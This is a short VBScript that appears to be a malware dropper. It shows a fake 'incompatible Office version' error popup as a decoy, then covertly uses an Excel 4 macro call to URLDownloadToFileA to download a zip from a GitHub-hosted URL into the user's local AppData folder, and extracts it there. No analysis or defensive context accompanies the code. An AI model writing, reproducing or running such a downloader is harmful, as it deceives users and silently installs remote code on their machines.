
set objShell = CreateObject("Shell.Application")
Set excelObj = CreateObject("Excel.ChartApplication")
Set shellObj = CreateObject("WScript.Shell")
call shellObj.PoPup ("The format of this document is not compatible with the version of Office that you are running. Check your computer's system information to see if you need an x86 (32-bit) or x64 (64-bit) version of this document.", -1, "Error", 16)
excelObj.visible = false
Set EnvVar = shellObj.Environment("PROCESS")
AppdataDirectory = EnvVar("LOCALAPPDATA")
FilePath = AppdataDirectory + "\manifest.zip"
UrlPath = "https://raw.githubusercontent.com/leachim7/hello-world/main/v/manifest.zip"
call excelObj.ExecuteExcel4Macro("CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"", 0, """+UrlPath+""", """+FilePath+""", 0, 0)")
WScript.Sleep 10000
set FilesInZip=objShell.NameSpace(FilePath).items
objShell.NameSpace(AppdataDirectory).CopyHere(FilesInZip)
WScript.Sleep 10000
